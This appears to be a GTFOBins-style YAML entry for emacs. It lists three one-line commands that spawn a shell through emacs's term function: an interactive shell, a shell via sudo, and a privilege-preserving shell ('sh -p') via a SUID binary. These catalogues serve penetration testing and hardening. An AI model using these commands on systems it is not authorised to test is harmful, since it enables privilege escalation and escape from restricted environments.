---
functions:
  exec-interactive:
    - code: emacs -Q -nw --eval '(term "/bin/sh")'
  sudo-enabled:
    - code: sudo emacs -Q -nw --eval '(term "/bin/sh")'
  suid-enabled:
    - code: ./emacs -Q -nw --eval '(term "/bin/sh -p")'
---
